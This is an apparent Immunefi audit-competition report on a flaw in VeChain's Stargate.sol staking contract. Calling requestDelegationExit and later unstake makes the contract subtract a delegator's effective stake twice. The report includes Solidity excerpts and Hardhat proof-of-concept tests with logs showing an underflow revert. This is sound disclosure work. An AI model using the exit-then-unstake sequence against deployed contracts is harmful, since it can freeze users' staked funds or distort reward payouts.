# 59904 sc high it s possible to decrease twice delegator stake in certain conditions

Submitted on Nov 16th 2025 at 20:50:22 UTC by @Paludo0x for [Audit Comp | Vechain | Stargate Hayabusa](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* Report ID: #59904
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* Impacts:
  * Permanent freezing of funds
  * Theft of unclaimed yield

## Description

### Brief / Intro

A delegator can trigger two scheduled decreases of the validator’s cumulative delegators effective stake by first calling `requestDelegationExit` while the validator is ACTIVE and later calling `unstake` after the validator becomes EXITED.

## Vulnerability Details

Updates of `delegatorsEffectiveStake` are handled through `_updatePeriodEffectiveStake`, which reads the current cumulative value for `_period` using `upperLookup` and then adds or subtracts the token’s current effective stake:

```solidity
function _updatePeriodEffectiveStake(
    StargateStorage storage $,
    address _validator,
    uint256 _tokenId,
    uint32 _period,
    bool _isIncrease
) private {
    // calculate the effective stake
    uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);

    // get the current effective stake
    uint256 currentValue = $.delegatorsEffectiveStake[_validator].upperLookup(_period);

    // calculate the updated effective stake
    uint256 updatedValue = _isIncrease
        ? currentValue + effectiveStake
        : currentValue - effectiveStake;

    // push the updated effective stake
    $.delegatorsEffectiveStake[_validator].push(_period, SafeCast.toUint224(updatedValue));
}
```

There are two different paths which schedule a decrease of `delegatorsEffectiveStake`. These are represented below as steps.

{% stepper %}
{% step %}

### Exit requested while validator is ACTIVE (schedules a decrease at completedPeriods + 2)

```solidity
// Get the latest completed period of the validator
(, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(
    delegation.validator
);
(, uint32 exitBlock) = $.protocolStakerContract.getDelegationPeriodDetails(delegationId);

// decrease the effective stake
_updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
```

This path schedules a decrease when the delegator calls `requestDelegationExit` while the validator is ACTIVE.
{% endstep %}

{% step %}

### Unstake when validator is EXITED (or delegation is PENDING) (schedules a decrease at oldCompletedPeriods + 2)

```solidity
if (
    currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
    delegation.status == DelegationStatus.PENDING
) {
    // get the completed periods of the previous validator
    (, , , uint32 oldCompletedPeriods) = $
        .protocolStakerContract
        .getValidationPeriodDetails(delegation.validator);

    // decrease the effective stake of the previous validator
    _updatePeriodEffectiveStake(
        $,
        delegation.validator,
        _tokenId,
        oldCompletedPeriods + 2,
        false // decrease
    );
```

This path schedules a decrease when `unstake` is called and the validator is EXITED or the delegation is PENDING.
{% endstep %}
{% endstepper %}

Because there is no specific guard preventing both scheduling actions for the same token, both scheduled decreases may subtract the same token’s effective stake at different future periods.

This is the snippet of the faulty code in `unstake()`:

```solidity
// if the delegation is pending or the validator is exited or unknown
// decrease the effective stake of the previous validator
if (
    currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
    delegation.status == DelegationStatus.PENDING
) {
    // get the completed periods of the previous validator
    (, , , uint32 oldCompletedPeriods) = $
        .protocolStakerContract
        .getValidationPeriodDetails(delegation.validator);

    // decrease the effective stake of the previous validator
    _updatePeriodEffectiveStake(
        $,
        delegation.validator,
        _tokenId,
        oldCompletedPeriods + 2,
        false // decrease
    );
}

if (delegation.status == DelegationStatus.PENDING) {
    // We emit an event to signal that the NFT exited the current pending delegation
    // to ensure that indexers can correctly track the delegation status
    emit DelegationExitRequested(
        _tokenId,
        delegation.validator,
        delegation.delegationId,
        Clock.clock()
    );
}
```

## Impact Details

The share formula used by `_claimableRewardsForPeriod`:

```solidity
uint256 delegationId = $.delegationIdByTokenId[_tokenId];
(address validator, , , ) = $.protocolStakerContract.getDelegation(delegationId);

uint256 delegationPeriodRewards = $.protocolStakerContract.getDelegatorsRewards(
    validator,
    _period
);

// get the effective stake of the token
uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);
// get the effective stake of the delegator in the period
uint256 delegatorsEffectiveStake = $.delegatorsEffectiveStake[validator].upperLookup(
    _period
);
// avoid division by zero
if (delegatorsEffectiveStake == 0) {
    return 0;
}

// return the claimable amount
return (effectiveStake * delegationPeriodRewards) / delegatorsEffectiveStake;
```

Consequences:

* When the second decrease lands on a period where the cumulative already reflects the first decrease (zero in a single-delegator validator), the subtraction attempts cause an underflow and therefore revert inside `_updatePeriodEffectiveStake`.
* When there are multiple delegators so the cumulative stays > 0, the double subtraction understates the denominator from that later period onward, inflating all other positions' shares.

Critical impact: Permanent freezing of funds — in pools where there is a sole delegator, the second scheduled decrease causes an underflow reverting `_updatePeriodEffectiveStake`. All flows that must apply this scheduled decrease will keep reverting, effectively freezing funds permanently.

## Proof of Concept

<details>

<summary>PoC logs and test cases (expand to view)</summary>

PoC 1 — demonstrates the vulnerability (revert / underflow when sole delegator):

```
delegatorsEffectiveStake before unstake: 0

balance before unstake: 49999998999435010749972320 
expected payout: 1000000000000000000

delegatorsEffectiveStake after revert: 0

balance after revert: 49999998999309969383653880 
delta: -125041366318440
    ✔ schedules a second decrease and reverts (underflow) if I am the sole delegator (43ms)
```

PoC 2 — demonstrates expected behaviour when validator stays ACTIVE (no second scheduled decrease):

```
delegatorsEffectiveStake before unstake: 0

balance before unstake: 49999998999435010749972320 
expected payout: 1000000000000000000

delegatorsEffectiveStake after unstake: 0

balance after unstake: 49999999998914239240352854 
delta: 999479228490380534
    ✔ does not schedule a second decrease when the validator stays active (67ms)
```

PoC tests to copy into Delegation.test.ts:

```javascript
it("schedules a second decrease and reverts (underflow) if I am the sole delegator", async function () {
    const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
    await (await stargateContract.connect(user).stake(LEVEL_ID, { value: levelSpec.vetAmountRequiredToStake })).wait();
    const tokenId = await stargateNFTMock.getCurrentTokenId();

    await (await stargateContract.connect(user).delegate(tokenId, validator.address)).wait();

    const P0 = 10;
    await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, P0);
    expect(await stargateContract.getDelegationStatus(tokenId)).to.equal(DELEGATION_STATUS_ACTIVE);

    await (await stargateContract.connect(user).requestDelegationExit(tokenId)).wait();

    const P2 = 12;
    await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_EXITED);
    await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, P2);

    const periodOfSecondDecrease = P2 + 2;
    const denominatorBefore = await stargateContract.getDelegatorsEffectiveStake(
        validator.address,
        periodOfSecondDecrease
    );
    const token = await stargateNFTMock.getToken(tokenId);
    const balBefore = await ethers.provider.getBalance(user.address);
    log(
        "\nperiod:",
        periodOfSecondDecrease,
        "\ndelegatorsEffectiveStake before unstake:",
        denominatorBefore.toString()
    );
    log(
        "\nbalance before unstake:",
        balBefore.toString(),
        "\nexpected payout:",
        token.vetAmountStaked.toString()
    );

    await expect(stargateContract.connect(user).unstake(tokenId)).to.be.reverted;

    const denominatorAfter = await stargateContract.getDelegatorsEffectiveStake(
        validator.address,
        periodOfSecondDecrease
    );
    log(
        "\ndelegatorsEffectiveStake after revert:",
        denominatorAfter.toString()
    );
    const balAfter = await ethers.provider.getBalance(user.address);
    log(
        "\nbalance after revert:",
        balAfter.toString(),
        "\ndelta:",
        (balAfter - balBefore).toString()
    );
});

it("does not schedule a second decrease when the validator stays active", async function () {
    const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
    await (await stargateContract.connect(user).stake(LEVEL_ID, { value: levelSpec.vetAmountRequiredToStake })).wait();
    const tokenId = await stargateNFTMock.getCurrentTokenId();

    await (await stargateContract.connect(user).delegate(tokenId, validator.address)).wait();

    const P0 = 20;
    await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, P0);
    expect(await stargateContract.getDelegationStatus(tokenId)).to.equal(DELEGATION_STATUS_ACTIVE);

    await (await stargateContract.connect(user).requestDelegationExit(tokenId)).wait();

    const P2 = 22;
    await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, P2);
    await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_ACTIVE);

    const controlPeriod = P2 + 2;
    const denominatorBeforeControl = await stargateContract.getDelegatorsEffectiveStake(
        validator.address,
        controlPeriod
    );
    log(
        "\nperiod before unstake:",
        controlPeriod,
        "\ndelegatorsEffectiveStake before unstake:",
        denominatorBeforeControl.toString()
    );

    const balBefore = await ethers.provider.getBalance(user.address);
    const token = await stargateNFTMock.getToken(tokenId);
    log(
        "\nbalance before unstake:",
        balBefore.toString(),
        "\nexpected payout:",
        token.vetAmountStaked.toString()
    );

    await expect(stargateContract.connect(user).unstake(tokenId)).to.not.be.reverted;

    const denominatorAfterControl = await stargateContract.getDelegatorsEffectiveStake(
        validator.address,
        controlPeriod
    );
    log(
        "\ndelegatorsEffectiveStake after unstake:",
        denominatorAfterControl.toString()
    );

    const balAfter = await ethers.provider.getBalance(user.address);
    const balanceDelta = balAfter - balBefore;
    log(
        "\nbalance after unstake:",
        balAfter.toString(),
        "\ndelta:",
        balanceDelta.toString()
    );
});
```

</details>

## Summary

* Root cause: lack of guard to prevent scheduling the same token's effective stake to be decreased twice via two different code paths (requestDelegationExit while ACTIVE and unstake when EXITED/PENDING).
* Consequences: underflow reverts when sole delegator -> permanent freeze; incorrect reward distribution when multiple delegators -> inflated shares for others.
* Files referenced: Stargate.sol (target repository link above).
